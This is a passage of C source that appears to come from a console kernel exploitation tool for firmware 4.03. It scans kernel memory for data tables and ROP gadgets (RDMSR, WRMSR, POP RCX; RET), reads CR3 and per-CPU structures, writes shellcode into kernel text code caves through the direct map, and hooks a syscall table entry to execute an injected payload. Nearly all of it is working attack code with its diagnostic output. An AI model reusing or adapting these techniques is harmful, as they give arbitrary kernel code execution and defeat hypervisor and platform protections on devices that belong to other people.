                        /* Compute uniqueness and spread */
                        int uniq = 0;
                        uint64_t pmin = tbl[0], pmax = tbl[0];
                        for (int u = 0; u < cnt; u++) {
                            if (tbl[u] < pmin) pmin = tbl[u];
                            if (tbl[u] > pmax) pmax = tbl[u];
                            int dup = 0;
                            for (int v = 0; v < u; v++)
                                if (tbl[v] == tbl[u]) { dup = 1; break; }
                            if (!dup) uniq++;
                        }
                        uint64_t spread = pmax - pmin;

                        int score = 0;
                        if (cnt == 28) score += 15;
                        else if (cnt >= 26 && cnt <= 30) score += 10;
                        /* Real apic_ops: spread 4KB-64KB */
                        if (spread >= 0x1000 && spread <= 0x10000) score += 20;
                        score += uniq;
                        /* Require slot[2] to be a valid ktext ptr */
                        if (cnt > 2 && is_ktext_ptr(tbl[2])) score += 10;

                        printf("    [TABLE] kdata+0x%lx: %d entries, %d unique, "
                               "spread=%luKB, score=%d\n",
                               (unsigned long)(run_start - g_kdata_base),
                               cnt, uniq,
                               (unsigned long)(spread >> 10), score);

                        if (score > best_score) {
                            best_score = score;
                            best_len = cnt;
                            best_addr = run_start;
                        }
                    }
                }
                run_len = 0;
            }
        }
    }
    /* Handle final run */
    if (run_len >= 26 && run_len <= 32) {
        uint64_t rs_pa = va_to_pa(run_start);
        if (rs_pa && rs_pa < MAX_SAFE_PA) {
            uint64_t tbl[40];
            int cnt = run_len;
            if (cnt > 40) cnt = 40;
            kernel_copyout(g_dmap_base + rs_pa, tbl, cnt * 8);
            int uniq = 0;
            for (int u = 0; u < cnt; u++) {
                int dup = 0;
                for (int v = 0; v < u; v++)
                    if (tbl[v] == tbl[u]) { dup = 1; break; }
                if (!dup) uniq++;
            }
            int score = (cnt == 28 ? 15 : 10) + uniq;
            if (cnt > 2 && is_ktext_ptr(tbl[2])) score += 10;
            if (score > best_score) {
                best_score = score;
                best_len = cnt;
                best_addr = run_start;
            }
        }
    }

    if (best_addr) {
        g_apic_ops_addr = best_addr;
        g_apic_ops_count = best_len;

        /* Read and display the winning table */
        uint64_t pa = va_to_pa(best_addr);
        uint64_t tbl[40];
        kernel_copyout(g_dmap_base + pa, tbl, best_len * 8);
        printf("[+] apic_ops at 0x%lx (kdata+0x%lx), %d entries, score=%d\n",
               (unsigned long)best_addr,
               (unsigned long)(best_addr - g_kdata_base),
               best_len, best_score);
        printf("    slot[2] (xapic_mode) = 0x%016lx (ktext+0x%lx)\n",
               (unsigned long)tbl[2],
               (unsigned long)(tbl[2] - g_ktext_base));
        for (int i = 0; i < best_len; i++) {
            printf("    [%2d] 0x%016lx  (ktext+0x%lx)\n",
                   i, (unsigned long)tbl[i],
                   (unsigned long)(tbl[i] - g_ktext_base));
        }
    } else {
        printf("[-] apic_ops not found in 8MB scan\n");
    }
}

/* ─── Kmod loading infrastructure ─── */

/* Minimal ELF64 types for symbol lookup */
typedef struct {
    unsigned char e_ident[16];
    uint16_t e_type, e_machine;
    uint32_t e_version;
    uint64_t e_entry, e_phoff, e_shoff;
    uint32_t e_flags;
    uint16_t e_ehsize, e_phentsize, e_phnum;
    uint16_t e_shentsize, e_shnum, e_shstrndx;
} Elf64_Ehdr_t;

typedef struct {
    uint32_t sh_name, sh_type;
    uint64_t sh_flags, sh_addr, sh_offset, sh_size;
    uint32_t sh_link, sh_info;
    uint64_t sh_addralign, sh_entsize;
} Elf64_Shdr_t;

typedef struct {
    uint32_t st_name;
    uint8_t  st_info, st_other;
    uint16_t st_shndx;
    uint64_t st_value, st_size;
} Elf64_Sym_t;

#define SHT_SYMTAB 2

/* ─── ktext gadget scanner ───
 *
 * Scans ktext for useful instruction sequences. Since we CAN read ktext
 * via DMAP (kernel_copyout works for small reads) but CANNOT write to it
 * (HV NPT enforces read-only on ktext physical pages), we need to find
 * existing code gadgets to construct calling mechanisms.
 *
 * Key gadgets:
 *   RDMSR (0F 32)       - read MSR, needs ECX set first
 *   WRMSR (0F 30)       - write MSR
 *   JMP [RSI] (FF 26)   - jump to [rsi], used by Byepervisor kexec
 *   MOV CR0 (0F 20 C0)  - read CR0 into RAX
 *   POP RCX; RET (59 C3) - set ECX from stack
 */

/* Gadget definitions for scanning */
struct gadget_pattern {
    const char *name;
    const uint8_t *bytes;
    size_t len;
};

static const uint8_t PAT_RDMSR[]    = {0x0F, 0x32};
static const uint8_t PAT_WRMSR[]    = {0x0F, 0x30};
static const uint8_t PAT_JMP_RSI[]  = {0xFF, 0x26};
static const uint8_t PAT_POP_RCX[]  = {0x59, 0xC3};
static const uint8_t PAT_MOV_CR0[]  = {0x0F, 0x20, 0xC0};
static const uint8_t PAT_MOV_CR3[]  = {0x0F, 0x20, 0xD8};
static const uint8_t PAT_MOV_CR4[]  = {0x0F, 0x20, 0xE0};
/* PAT_IRETQ removed - not scanned */

/* Results */
#define MAX_GADGETS 32
struct gadget_result {
    uint64_t kva;           /* kernel virtual address */
    const char *name;
    uint8_t context[16];    /* bytes around the gadget for analysis */
};

static struct gadget_result g_gadgets[MAX_GADGETS];
static int g_num_gadgets = 0;

/* Search for a byte pattern in a buffer */
static int find_pattern(const uint8_t *buf, size_t buflen,
                        const uint8_t *pat, size_t patlen,
                        size_t *offsets, int max_matches) {
    int count = 0;
    for (size_t i = 0; i + patlen <= buflen && count < max_matches; i++) {
        int match = 1;
        for (size_t j = 0; j < patlen; j++) {
            if (buf[i+j] != pat[j]) { match = 0; break; }
        }
        if (match) offsets[count++] = i;
    }
    return count;
}

static void scan_ktext_gadgets(void) {
    printf("\n[*] Scanning ktext for gadgets...\n");

    if (!g_ktext_base || !g_kdata_base || !g_dmap_base) {
        printf("[-] Missing base addresses\n");
        return;
    }

    static const struct gadget_pattern patterns[] = {
        {"RDMSR",       PAT_RDMSR,   2},
        {"WRMSR",       PAT_WRMSR,   2},
        {"JMP_RSI",     PAT_JMP_RSI, 2},
        {"POP_RCX_RET", PAT_POP_RCX, 2},
        {"MOV_CR0",     PAT_MOV_CR0, 3},
        {"MOV_CR3",     PAT_MOV_CR3, 3},
        {"MOV_CR4",     PAT_MOV_CR4, 3},
    };
    int num_patterns = sizeof(patterns) / sizeof(patterns[0]);

    /* Track counts per pattern */
    int pattern_counts[7] = {0};
    uint64_t first_match[7] = {0};

    /* Scan ktext in 256-byte chunks.
     * ktext is ~12MB so this is ~49152 reads. We sample every 8th page
     * for speed (covers 1 page per 2MB region minimum), then do a fine
     * scan around interesting hits. */
    uint64_t ktext_size = g_kdata_base - g_ktext_base;
    uint64_t scan_step = 0x1000;  /* scan every page */
    uint64_t chunk_size = 256;
    uint64_t pages_read = 0;
    (void)0; /* pages_failed removed */

    printf("[*] ktext range: 0x%lx - 0x%lx (%lu KB)\n",
           (unsigned long)g_ktext_base, (unsigned long)g_kdata_base,
           (unsigned long)(ktext_size / 1024));

    for (uint64_t va = g_ktext_base; va < g_kdata_base; va += scan_step) {
        uint64_t pa = va_to_pa(va);
        if (!pa) continue;

        /* Read page in 256-byte chunks */
        for (uint64_t off = 0; off < 0x1000 && va + off < g_kdata_base; off += chunk_size) {
            uint8_t buf[256];
            if (kernel_copyout(g_dmap_base + pa + off, buf, chunk_size) != 0)
                continue;

            /* Search for each pattern */
            for (int p = 0; p < num_patterns; p++) {
                size_t offsets[8];
                int n = find_pattern(buf, chunk_size,
                                     patterns[p].bytes, patterns[p].len,
                                     offsets, 8);
                for (int i = 0; i < n; i++) {
                    uint64_t gadget_kva = va + off + offsets[i];
                    pattern_counts[p]++;

                    /* Store first few of each type */
                    if (pattern_counts[p] <= 3 && g_num_gadgets < MAX_GADGETS) {
                        struct gadget_result *g = &g_gadgets[g_num_gadgets++];
                        g->kva = gadget_kva;
                        g->name = patterns[p].name;
                        /* Copy context (up to 16 bytes from match point) */
                        size_t ctx_avail = chunk_size - offsets[i];
                        if (ctx_avail > 16) ctx_avail = 16;
                        memcpy(g->context, buf + offsets[i], ctx_avail);
                        if (ctx_avail < 16) memset(g->context + ctx_avail, 0, 16 - ctx_avail);
                    }
                    if (pattern_counts[p] == 1)
                        first_match[p] = gadget_kva;
                }
            }
        }
        pages_read++;

        /* Progress every 1000 pages */
        if (pages_read % 2000 == 0) {
            printf("    Scanned %lu pages...\r", (unsigned long)pages_read);
            fflush(stdout);
        }
    }

    printf("[+] Scanned %lu ktext pages                    \n", (unsigned long)pages_read);

    /* Report results */
    for (int p = 0; p < num_patterns; p++) {
        if (pattern_counts[p] > 0) {
            printf("    %-12s: %d found, first at ktext+0x%lx\n",
                   patterns[p].name, pattern_counts[p],
                   (unsigned long)(first_match[p] - g_ktext_base));
        } else {
            printf("    %-12s: not found\n", patterns[p].name);
        }
    }

    /* Dump context for first few gadgets of interest */
    printf("\n[*] Gadget details:\n");
    for (int i = 0; i < g_num_gadgets; i++) {
        struct gadget_result *g = &g_gadgets[i];
        printf("    %s @ 0x%lx (ktext+0x%lx): ",
               g->name, (unsigned long)g->kva,
               (unsigned long)(g->kva - g_ktext_base));
        for (int j = 0; j < 16; j++)
            printf("%02x ", g->context[j]);
        printf("\n");
    }

    /* Check for usable RDMSR gadget: look for "pop rcx; rdmsr" or
     * "mov ecx, ...; rdmsr; ret" near RDMSR locations */
    for (int i = 0; i < g_num_gadgets; i++) {
        if (strcmp(g_gadgets[i].name, "RDMSR") == 0) {
            /* Check if preceded by pop rcx (59) - would be at kva-1 */
            uint64_t pre_pa = va_to_pa(g_gadgets[i].kva - 4);
            if (pre_pa) {
                uint8_t pre[4];
                if (kernel_copyout(g_dmap_base + pre_pa, pre, 4) == 0) {
                    printf("    RDMSR@0x%lx pre-context: %02x %02x %02x %02x\n",
                           (unsigned long)(g_gadgets[i].kva - g_ktext_base),
                           pre[0], pre[1], pre[2], pre[3]);
                    /* Check for "pop rcx; rdmsr" */
                    if (pre[2] == 0x59 && pre[3] == 0x0F) {
                        printf("    *** FOUND: pop rcx; rdmsr sequence! ***\n");
                    }
                    /* Check for ret after rdmsr (context[2]) */
                    if (g_gadgets[i].context[2] == 0xC3) {
                        printf("    *** FOUND: rdmsr; ret sequence! ***\n");
                    }
                }
            }
        }
    }
}

/* ─── Read MSR/CR values from kernel data structures ───
 *
 * Extract MSR/CR values directly from kernel memory without ring 0.
 * Many values are stored in per-CPU or thread structures. */

static void read_msr_from_kernel_data(void) {
    printf("\n[*] Reading MSR/CR values from kernel data structures...\n");

    /* CR3: already known from pmap */
    printf("    CR3            = 0x%016lx (from pmap)\n", (unsigned long)g_cr3_phys);

    /* Try sysarch() for FS_BASE and GS_BASE (ring 3 values) */
    {
        uint64_t fsbase = 0, gsbase = 0;
        if (sysarch(AMD64_GET_FSBASE, (void *)&fsbase) == 0)
            printf("    FS_BASE (r3)   = 0x%016lx (via sysarch)\n", (unsigned long)fsbase);
        else
            printf("    FS_BASE (r3)   = sysarch failed (errno=%d)\n", errno);

        if (sysarch(AMD64_GET_GSBASE, (void *)&gsbase) == 0)
            printf("    GS_BASE (r3)   = 0x%016lx (via sysarch)\n", (unsigned long)gsbase);
        else
            printf("    GS_BASE (r3)   = sysarch failed (errno=%d)\n", errno);
    }

    /* Read kernel GS_BASE from PCPU structure.
     * The kernel's GS_BASE MSR points to the per-CPU (PCPU) struct.
     * PCPU is at a known offset in kdata. */
    {
        uint64_t pcpu_addr = g_kdata_base + KSTUFF_PCPU_OFF;
        uint64_t pcpu_pa = va_to_pa(pcpu_addr);
        if (pcpu_pa) {
            /* PCPU struct: first few fields include curthread, etc.
             * On FreeBSD, PCPU is accessed via gs:[offset].
             * The GS_BASE value IS the PCPU address. */
            printf("    KGS_BASE       = 0x%016lx (PCPU at kdata+0x%lx)\n",
                   (unsigned long)pcpu_addr, (unsigned long)KSTUFF_PCPU_OFF);

            /* Read curthread from PCPU[0x18] (pc_curthread on FreeBSD) */
            uint64_t curthread = 0;
            kernel_copyout(g_dmap_base + pcpu_pa + 0x18, &curthread, 8);
            if (curthread)
                printf("    curthread      = 0x%016lx\n", (unsigned long)curthread);
        }
    }

    /* Read kernel pmap (for kernel CR3 if different from process CR3) */
    {
        uint64_t kpmap_addr = g_kdata_base + KSTUFF_KERNEL_PMAP_STORE_OFF;
        uint64_t kpmap_pa = va_to_pa(kpmap_addr);
        if (kpmap_pa) {
            uint64_t kpmap_val = 0;
            kernel_copyout(g_dmap_base + kpmap_pa, &kpmap_val, 8);
            if (kpmap_val) {
                uint64_t kcr3 = 0;
                uint64_t kcr3_pa = va_to_pa(kpmap_val + 0x28);
                if (kcr3_pa) {
                    kernel_copyout(g_dmap_base + kcr3_pa, &kcr3, 8);
                    printf("    Kernel CR3     = 0x%016lx (from kernel_pmap)\n",
                           (unsigned long)kcr3);
                }
            }
        }
    }

    /* LSTAR can be inferred: it points to the syscall entry in ktext.
     * On FreeBSD, LSTAR = Xfast_syscall. We can find it by looking at
     * the known doreti_iret offset (which is in the same area). */
    {
        (void)KSTUFF_DORETI_IRET_OFF;
        /* doreti_iret is a few instructions after Xfast_syscall's iretq.
         * The actual LSTAR is earlier. We can scan backward for the
         * swapgs; lfence sequence that starts Xfast_syscall.
         * But for now, just report what we know. */
        printf("    LSTAR (est)    ~ ktext+0x2307xx area (near doreti_iret)\n");
    }

    printf("[*] Note: Ring 0 readings require gadget-based execution.\n");
    printf("    Run gadget scan to find usable RDMSR sequences.\n");
}

/* ─── Direct sysent-based kernel function calling ───
 *
 * Hook sysent[253] to point to a known kernel function, call it
 * via syscall(253), read the return value. This lets us call
 * kmem_alloc, kproc_create, etc. directly using known offsets. */

static uint64_t sysent_call_func(uint64_t func_kva, uint64_t arg1) {
    /* Hook sysent[253].sy_call to func_kva, set narg=1, call syscall(253).
     * The kernel dispatches as: func_kva(td, uap)
     * For kmem_alloc(size): td is ignored, uap points to userland args.
     * But sysent dispatch passes td as first arg, not our arg1.
     *
     * Actually, FreeBSD sysent calls: sy_call(struct thread *td, void *uap)
     * where uap points to the copyin'd syscall arguments.
     * For narg=1, uap[0] = first syscall arg.
     *
     * But kmem_alloc(size_t size) expects size in rdi.
     * When called via sysent, rdi = td (thread pointer), rsi = uap.
     * So we can't call kmem_alloc directly via sysent.
     *
     * Solution: we don't need to call kmem_alloc this way.
     * Instead, we use the known nop_ret gadget. We write a tiny
     * stub at a known location, or we use a different approach.
     *
     * Better solution: hook sysent[253] to point directly to our
     * flat binary module_start. module_start(args) takes a pointer.
     * When called via sysent: module_start(td, uap).
     * td is NOT our args pointer. But we can embed the args address
     * in the flat binary itself. */

    /* This function is currently unused — the direct approach below
     * handles everything we need. */
    (void)func_kva;
    (void)arg1;
    return 0;
}

/* ─── Direct sysent invocation of flat binary ───
 *
 * Write our flat binary to a known executable kernel address and
 * invoke it via sysent hook. We use the known kmem_alloc offset
 * to allocate RWX memory first, by calling it through a sysent
 * stub. But since sysent dispatch passes (td, uap) not our args,
 * we need a different approach.
 *
 * Approach: Write a minimal assembly stub that:
 *   1. Loads the args pointer (embedded as immediate)
 *   2. Calls the flat binary payload
 *   3. Returns
 * The stub goes in ktext (overwriting dead code temporarily).
 * We know nop_ret is a "nop; ret" at a known ktext offset.
 * After nop_ret there's likely a wrmsr_ret function.
 * We overwrite from nop_ret backward into dead space.
 *
 * Actually, simplest approach: put the stub + payload in kdata.
 * kdata pages are RW but NOT executable... unless we also clear
 * NX on the kdata PDE. But the hypervisor NPT might block that.
 *
 * Simplest safe approach: use kernel_copyin to write directly
 * to allocated memory. We call kmem_alloc through a creative
 * chain, or we just write our module_start code into the
 * result buffer's DMAP address and hook sysent to point there.
 *
 * Wait — we already know that ktext pages ARE executable and
 * we CAN write to them via DMAP. The code cave scan returned
 * 0 pages, but va_to_pa worked (returned 0x53b0000). The issue
 * must be kernel_copyout failing. But kernel_copyin might work!
 * DMAP writes may succeed even if DMAP reads fail for ktext.
 *
 * NEW APPROACH: Don't scan for a cave. Use a KNOWN safe location.
 * nop_ret (ktext+0x22df36) is followed by justreturn at ktext+0x230670.
 * There's ~10KB between them. Just use that region directly. */

static int load_kmod_direct(void *result_vaddr, uint64_t result_kva) {
    printf("\n[*] Trying direct sysent approach (known offsets)...\n");

    if (!g_sysent_kva) {
        printf("[-] sysent not discovered\n");
        return -1;
    }
    if (g_fw_version != 0x4030000) {
        printf("[-] Direct approach requires FW 4.03 offsets\n");
        return -1;
    }

    /* Use a known empty region in ktext for our stub + payload.
     * We'll write right after wrmsr_ret (which is nop_ret - 2).
     * wrmsr_ret is at kdata + (-0x9d20cc) = ktext + 0x22df34.
     * nop_ret is at ktext + 0x22df36 (= wrmsr_ret + 2).
     *
     * We need space after nop_ret. Read bytes there to check if safe. */
    uint64_t nop_ret_kva = g_kdata_base + KSTUFF_NOP_RET_OFF;
    /* Place our code 64 bytes after nop_ret to avoid clobbering it */
    uint64_t stub_kva = (nop_ret_kva + 64) & ~0xFULL; /* 16-byte aligned */

    printf("[*] nop_ret KVA: 0x%lx (ktext+0x%lx)\n",
           (unsigned long)nop_ret_kva,
           (unsigned long)(nop_ret_kva - g_ktext_base));
    printf("[*] Stub placement: 0x%lx (ktext+0x%lx)\n",
           (unsigned long)stub_kva,
           (unsigned long)(stub_kva - g_ktext_base));

    /* Resolve physical address via DMAP */
    uint64_t stub_pa = va_to_pa(stub_kva);
    if (!stub_pa) {
        printf("[-] stub VA->PA failed\n");
        return -1;
    }
    uint64_t stub_dmap = g_dmap_base + stub_pa;
    printf("[+] Stub PA: 0x%lx DMAP: 0x%lx\n",
           (unsigned long)stub_pa, (unsigned long)stub_dmap);

    /* Set up args in the result buffer (at offset 0x1000) */
    struct kmod_flat_args *args_ptr = (struct kmod_flat_args *)
        ((uint8_t *)result_vaddr + 0x1000);
    args_ptr->output_kva = result_kva;
    args_ptr->kdata_base = g_kdata_base;
    args_ptr->fw_ver = (uint32_t)(g_fw_version >> 16);
    args_ptr->pad = 0;

    /* Get DMAP KVA of args (kernel can read this via DMAP) */
    uint64_t args_cpu_pa = va_to_cpu_pa((uint64_t)args_ptr);
    if (!args_cpu_pa) {
        printf("[-] args VA->PA failed\n");
        return -1;
    }
    uint64_t args_dmap_kva = g_dmap_base + args_cpu_pa;
    printf("[+] Args DMAP KVA: 0x%lx\n", (unsigned long)args_dmap_kva);

    /* Build stub:
     *   movabs $args_dmap_kva, %rdi    ; 10 bytes (48 BF <imm64>)
     *   <module_start code follows>    ; payload
     *
     * Since sysent calls stub(td, uap), rdi=td. Our stub overwrites
     * rdi with the args pointer, then falls into module_start. */
    size_t stub_prefix_len = 10;
    size_t total_len = stub_prefix_len + (size_t)KMOD_FLAT_SZ;

    /* Save original bytes */
    uint8_t *saved = malloc(total_len);
    if (!saved) { printf("[-] malloc failed\n"); return -1; }
    kernel_copyout(stub_dmap, saved, total_len);
    printf("[+] Saved %zu bytes from ktext\n", total_len);

    /* Build stub + payload */
    uint8_t *code = malloc(total_len);
    if (!code) { free(saved); return -1; }

    /* movabs $args_dmap_kva, %rdi */
    code[0] = 0x48; code[1] = 0xBF;
    memcpy(&code[2], &args_dmap_kva, 8);

    /* Append flat binary payload */
    memcpy(code + stub_prefix_len, KMOD_FLAT, (size_t)KMOD_FLAT_SZ);

    /* Write stub + payload to ktext via DMAP */
    kernel_copyin(code, stub_dmap, total_len);
    printf("[+] Wrote %zu bytes (stub + payload) to ktext via DMAP\n", total_len);

    /* Verify write */
    uint8_t verify[16];
    kernel_copyout(stub_dmap, verify, 16);
    if (memcmp(verify, code, 16) != 0) {
        printf("[-] Write verification failed! DMAP write to ktext blocked?\n");
        printf("    Wrote: ");
        for (int i = 0; i < 16; i++) printf("%02x ", code[i]);
        printf("\n    Read:  ");
        for (int i = 0; i < 16; i++) printf("%02x ", verify[i]);
        printf("\n");
        free(saved); free(code);
        return -1;
    }
    printf("[+] Write verified OK\n");

    /* Hook sysent[253] to point to our stub in ktext */
    #define DIRECT_INVOKE_SYSCALL 253
    uint64_t ent_kva = g_sysent_kva +
                       (uint64_t)DIRECT_INVOKE_SYSCALL * SYSENT_STRIDE;
    uint64_t ent_pa = va_to_pa(ent_kva);
    if (!ent_pa) {
        printf("[-] sysent VA->PA failed\n");
        kernel_copyin(saved, stub_dmap, total_len);
        free(saved); free(code);
        return -1;
    }

    uint8_t orig_sysent[SYSENT_STRIDE];
    kernel_copyout(g_dmap_base + ent_pa, orig_sysent, SYSENT_STRIDE);

    /* Set sy_call = stub_kva */
    uint64_t call_pa = va_to_pa(ent_kva + 8);
    kernel_copyin(&stub_kva, g_dmap_base + call_pa, 8);

    /* Set narg = 0 */
    int32_t narg = 0;
    kernel_copyin(&narg, g_dmap_base + ent_pa, 4);

    printf("[+] sysent[%d] -> 0x%lx\n", DIRECT_INVOKE_SYSCALL,
           (unsigned long)stub_kva);

    /* Fire! */
    printf("[*] Calling syscall(%d)...\n", DIRECT_INVOKE_SYSCALL);
    fflush(stdout);

    long sc_ret = syscall(DIRECT_INVOKE_SYSCALL);
    printf("[+] syscall returned %ld (errno=%d)\n", sc_ret, errno);

    /* Restore sysent + ktext immediately */
    kernel_copyin(orig_sysent, g_dmap_base + ent_pa, SYSENT_STRIDE);
    kernel_copyin(saved, stub_dmap, total_len);
    printf("[+] Restored sysent and ktext\n");

    free(saved); free(code);

    /* Check results */
    struct kmod_result_buf *results = (struct kmod_result_buf *)result_vaddr;
    if (results->magic == KMOD_MAGIC && results->status == KMOD_STATUS_DONE) {
        return 0;
    }

    printf("[!] Kmod did not complete (magic=0x%lx status=%u)\n",
           (unsigned long)results->magic, results->status);
    return -1;
}

/* ─── Code cave approach: write shellcode to ktext padding ─── */

static int load_kmod_codecave(void *result_vaddr, uint64_t result_kva) {
    printf("\n[*] Trying code cave approach (write to ktext padding)...\n");

    if (!g_sysent_kva) {
        printf("[-] sysent not discovered\n");
        return -1;
    }

    /* Scan ktext for a code cave: a run of 0xCC (INT3) or 0x00 bytes
     * large enough for our flat binary (~352 bytes). Need 512+ bytes
     * to be safe. Scan via DMAP reads. */
    size_t cave_needed = (size_t)KMOD_FLAT_SZ + 64; /* payload + safety margin */
    uint64_t cave_kva = 0;
    uint64_t ktext_end = g_kdata_base; /* ktext ends where kdata begins */
    uint64_t scan_start = g_ktext_base;

    /* Diagnostic: check what va_to_pa returns for first ktext page */
    {
        uint64_t test_pa = va_to_pa(scan_start);
        printf("[*] va_to_pa(ktext_start) = 0x%lx (MAX_SAFE_PA=0x%lx)\n",
               (unsigned long)test_pa, (unsigned long)MAX_SAFE_PA);
    }

    printf("[*] Scanning ktext (0x%lx - 0x%lx) for %zu-byte code cave...\n",
           (unsigned long)scan_start, (unsigned long)ktext_end, cave_needed);

    /* Scan in 4KB pages.
     * Note: no MAX_SAFE_PA check here — ktext pages may be mapped at
     * high physical addresses but DMAP still handles them correctly. */
    uint64_t best_run_start = 0;
    size_t best_run_len = 0;
    size_t current_run = 0;
    uint64_t current_run_start = 0;
    uint64_t pages_scanned = 0;

    for (uint64_t va = scan_start; va < ktext_end && !cave_kva; va += 0x1000) {
        uint64_t pa = va_to_pa(va);
        if (!pa) {
            current_run = 0;
            continue;
        }

        uint8_t page[4096];
        if (kernel_copyout(g_dmap_base + pa, page, 4096) != 0) {
            current_run = 0;
            continue;
        }
        pages_scanned++;

        for (int i = 0; i < 4096; i++) {
            if (page[i] == 0xCC || page[i] == 0x00) {
                if (current_run == 0)
                    current_run_start = va + i;
                current_run++;
                if (current_run >= cave_needed && current_run > best_run_len) {
                    best_run_start = current_run_start;
                    best_run_len = current_run;
                    cave_kva = best_run_start;
                }
            } else {
                current_run = 0;
            }
        }
    }

    printf("    Scanned %lu pages\n", (unsigned long)pages_scanned);

    if (!cave_kva) {
        printf("[-] No suitable code cave found (best run: %zu bytes at 0x%lx)\n",
               best_run_len, (unsigned long)best_run_start);
        return -1;
    }

    /* Align cave to 16 bytes */
    cave_kva = (cave_kva + 15) & ~15ULL;
    printf("[+] Code cave at 0x%lx (ktext+0x%lx), %zu bytes available\n",
           (unsigned long)cave_kva,
           (unsigned long)(cave_kva - g_ktext_base),
           best_run_len);

    /* Get physical address of cave via page table walk */
    uint64_t cave_pa = va_to_pa(cave_kva);
    if (!cave_pa) {
        printf("[-] Cave VA->PA failed\n");
        return -1;
    }
    uint64_t cave_dmap = g_dmap_base + cave_pa;

    /* Save original bytes */
    size_t save_len = (size_t)KMOD_FLAT_SZ;
    uint8_t *saved_bytes = malloc(save_len);
    if (!saved_bytes) {
        printf("[-] malloc failed\n");
        return -1;
    }
    kernel_copyout(cave_dmap, saved_bytes, save_len);

    /* Write flat binary shellcode to ktext via DMAP */
    kernel_copyin((void *)KMOD_FLAT, cave_dmap, (size_t)KMOD_FLAT_SZ);
    printf("[+] Wrote %lu bytes of shellcode to ktext cave via DMAP\n",
           (unsigned long)KMOD_FLAT_SZ);

    /* Verify write */
    uint8_t verify[16];
    kernel_copyout(cave_dmap, verify, 16);
    if (memcmp(verify, KMOD_FLAT, 16) != 0) {
        printf("[-] Shellcode write verification failed!\n");
        printf("    Expected: ");
        for (int i = 0; i < 16; i++) printf("%02x ", KMOD_FLAT[i]);
        printf("\n    Got:      ");
        for (int i = 0; i < 16; i++) printf("%02x ", verify[i]);
        printf("\n");
        free(saved_bytes);
        return -1;
    }
    printf("[+] Write verified OK\n");

    /* Set up args in the result buffer area (we have 0x4000 bytes).
     * Put args at offset 0x1000 in the result buffer allocation. */
    struct kmod_flat_args *args_ptr = (struct kmod_flat_args *)
        ((uint8_t *)result_vaddr + 0x1000);
    args_ptr->output_kva = result_kva;
    args_ptr->kdata_base = g_kdata_base;
    args_ptr->fw_ver = (uint32_t)(g_fw_version >> 16);
    args_ptr->pad = 0;

    /* Get DMAP address of args */
    uint64_t args_cpu_pa = va_to_cpu_pa((uint64_t)args_ptr);
    uint64_t args_kva = g_dmap_base + args_cpu_pa;
    printf("[+] Args at DMAP 0x%lx\n", (unsigned long)args_kva);

    /* Hook sysent[253] to point to our code cave */
    #define CAVE_INVOKE_SYSCALL 253
    uint64_t ent_kva = g_sysent_kva +
                       (uint64_t)CAVE_INVOKE_SYSCALL * SYSENT_STRIDE;
    uint64_t ent_pa = va_to_pa(ent_kva);
    if (!ent_pa) {
        printf("[-] sysent[%d] VA->PA failed\n", CAVE_INVOKE_SYSCALL);
        kernel_copyin(saved_bytes, cave_dmap, save_len);
        free(saved_bytes);
        return -1;
    }

    /* Save original sysent entry */
    uint8_t orig_sysent[SYSENT_STRIDE];
    kernel_copyout(g_dmap_base + ent_pa, orig_sysent, SYSENT_STRIDE);

    /* Write cave_kva to sy_call (offset +8) */
    uint64_t call_pa = va_to_pa(ent_kva + 8);
    if (!call_pa) {
        printf("[-] sysent sy_call VA->PA failed\n");
        kernel_copyin(saved_bytes, cave_dmap, save_len);
        free(saved_bytes);
        return -1;
    }
    kernel_copyin(&cave_kva, g_dmap_base + call_pa, 8);

    /* Set narg=1 (one pointer argument) at offset +0 */
    int32_t narg_one = 1;
    kernel_copyin(&narg_one, g_dmap_base + ent_pa, 4);

    printf("[+] sysent[%d] hooked -> cave 0x%lx\n",
           CAVE_INVOKE_SYSCALL, (unsigned long)cave_kva);

    /* The flat binary's module_start expects (kmod_args *args).
     * When called via sysent, the kernel calls sy_call(td, uap).
     * The first arg (td) will be passed instead of args.
     *
     * We need a different approach: write a tiny stub that loads
     * the args pointer and calls module_start. Since we're already
     * in the code cave, prepend a stub:
     *   movabs $args_kva, %rdi
     *   jmp module_start  (which is right after the stub)
     */

    /* Rebuild: write stub + payload */
    uint8_t stub[16];
    int sp = 0;
    /* movabs $args_kva, %rdi */
    stub[sp++] = 0x48; stub[sp++] = 0xBF;
    memcpy(&stub[sp], &args_kva, 8); sp += 8;
    /* jmp +0 (skip to payload, offset = 0 since payload follows immediately) */
    /* Actually payload starts right after stub, so just fall through.
     * But module_start expects to be at offset 0, so we need to:
     * movabs $args, %rdi; then fall into module_start code.
     * However module_start's prologue saves regs and uses rdi as first arg.
     * We just need rdi = args_kva when module_start starts. */

    /* Write stub first, then payload right after */
    kernel_copyin(stub, cave_dmap, sp);
    kernel_copyin((void *)KMOD_FLAT, cave_dmap + sp, (size_t)KMOD_FLAT_SZ);

    /* Update sysent to point to cave_kva (stub start) - already done */
    printf("[+] Stub (%d bytes) + payload (%lu bytes) written\n",
           sp, (unsigned long)KMOD_FLAT_SZ);

    /* Fire! */
    printf("[*] Calling syscall(%d)...\n", CAVE_INVOKE_SYSCALL);
    fflush(stdout);

    long sc_ret = syscall(CAVE_INVOKE_SYSCALL);
    printf("[+] syscall returned %ld (errno=%d)\n", sc_ret, errno);

    /* Restore sysent + cave immediately */
    kernel_copyin(orig_sysent, g_dmap_base + ent_pa, SYSENT_STRIDE);
    kernel_copyin(saved_bytes, cave_dmap, save_len + sp);
    free(saved_bytes);
    printf("[+] sysent[%d] and code cave restored\n", CAVE_INVOKE_SYSCALL);

    /* Check results */
    struct kmod_result_buf *results = (struct kmod_result_buf *)result_vaddr;
    if (results->magic == KMOD_MAGIC && results->status == KMOD_STATUS_DONE) {
        return 0;
    }

    printf("[!] Kmod did not complete (magic=0x%lx status=%u)\n",
           (unsigned long)results->magic, results->status);
    return -1;
}

static void load_kmod(void) {
    printf("\n=============================================\n");
    printf("  Loading Kernel Module\n");
    printf("=============================================\n\n");

    printf("[*] .ko size: %lu bytes\n", KMOD_KO_SZ);

    /* Step 1: Allocate shared result buffer */
    #define KMOD_RESULT_ALLOC_SIZE 0x4000
    off_t result_phys = 0;
    void *result_vaddr = NULL;

    int ret = sceKernelAllocateDirectMemory(0, 0x180000000ULL,
        KMOD_RESULT_ALLOC_SIZE, 0x4000, SCE_KERNEL_WB_ONION, &result_phys);
    if (ret != 0) { printf("[-] AllocateDirectMemory failed: 0x%x\n", ret); return; }

    ret = sceKernelMapDirectMemory(&result_vaddr, KMOD_RESULT_ALLOC_SIZE,
